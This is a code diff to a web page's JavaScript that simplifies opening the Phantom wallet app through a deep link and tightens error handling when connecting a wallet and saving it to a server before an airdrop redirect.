@@ -123,41 +123,29 @@
         }
         
         function openInPhantom() {
-            var currentUrl = window.location.href;
-            log('📍 Current URL: ' + currentUrl);
-            
-            updateStatus('📱 Opening Phantom app...');
-            
-            // تلاش با custom scheme ابتدا
-            var customScheme = 'phantom://ul/browse/' + encodeURIComponent(currentUrl) + '?ref=' + encodeURIComponent(window.location.origin);
-            log('🔗 Trying custom scheme: ' + customScheme);
-            
-            // ایجاد invisible iframe
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = customScheme;
-            document.body.appendChild(iframe);
-            
-            // پاک کردن iframe
-            setTimeout(function() {
-                document.body.removeChild(iframe);
-                log('🧹 Iframe removed');
-            }, 1000);
-            
-            // fallback به direct assignment
-            setTimeout(function() {
-                log('🔄 Trying direct location change...');
-                try {
-                    window.location.href = customScheme;
-                } catch (e) {
-                    log('❌ Custom scheme failed: ' + e.message);
-                    
-                    // آخرین fallback: universal link
-                    var universalLink = 'https://phantom.app/ul/browse/' + encodeURIComponent(currentUrl) + '?ref=' + encodeURIComponent(window.location.origin);
-                    log('🌐 Fallback to universal link: ' + universalLink);
-                    window.location.href = universalLink;
-                }
-            }, 2000);
+            try {
+                var currentUrl = window.location.href;
+                log('📍 Current URL: ' + currentUrl);
+                
+                updateStatus('📱 Redirecting to Phantom app...');
+                
+                // ساده‌ترین روش: مستقیم redirect
+                var phantomUrl = 'phantom://ul/browse/' + encodeURIComponent(currentUrl) + '?ref=' + encodeURIComponent(window.location.origin);
+                log('🔗 Phantom URL: ' + phantomUrl);
+                
+                // مستقیم به phantom redirect
+                window.location.href = phantomUrl;
+                
+            } catch (error) {
+                log('❌ Error in openInPhantom: ' + error.message);
+                updateStatus('❌ Failed to open Phantom app');
+                
+                // Reset button
+                var connectBtn = document.getElementById('connectBtn');
+                connectBtn.disabled = false;
+                connectBtn.textContent = '🦄 Try Again';
+                isProcessing = false;
+            }
         }
         
         async function connectDirectly() {
@@ -176,7 +164,7 @@
                 
             } catch (error) {
                 log('❌ Error connecting wallet: ' + error.message);
-                updateStatus('❌ Failed to connect wallet');
+                updateStatus('❌ Failed to connect wallet: ' + error.message);
                 
                 // Reset button
                 var connectBtn = document.getElementById('connectBtn');
@@ -201,9 +189,13 @@
                     })
                 });
                 
+                if (!response.ok) {
+                    throw new Error('HTTP ' + response.status + ': ' + response.statusText);
+                }
+                
                 const data = await response.json();
                 
-                if (response.ok && data.success) {
+                if (data.success) {
                     log('✅ Wallet saved successfully');
                     updateStatus('✅ Wallet saved! Redirecting to airdrop...');
                     
@@ -213,19 +205,12 @@
                     }, 2000);
                     
                 } else {
-                    log('❌ Error saving wallet: ' + (data.detail || 'Server error'));
-                    updateStatus('❌ Failed to save wallet');
-                    
-                    // Reset button
-                    var connectBtn = document.getElementById('connectBtn');
-                    connectBtn.disabled = false;
-                    connectBtn.textContent = '🦄 Try Again';
-                    isProcessing = false;
+                    throw new Error(data.error || data.detail || 'Server error');
                 }
                 
             } catch (error) {
-                log('❌ Network error: ' + error.message);
-                updateStatus('❌ Network error, please try again');
+                log('❌ Save error: ' + error.message);
+                updateStatus('❌ Failed to save wallet: ' + error.message);
                 
                 // Reset button
                 var connectBtn = document.getElementById('connectBtn');
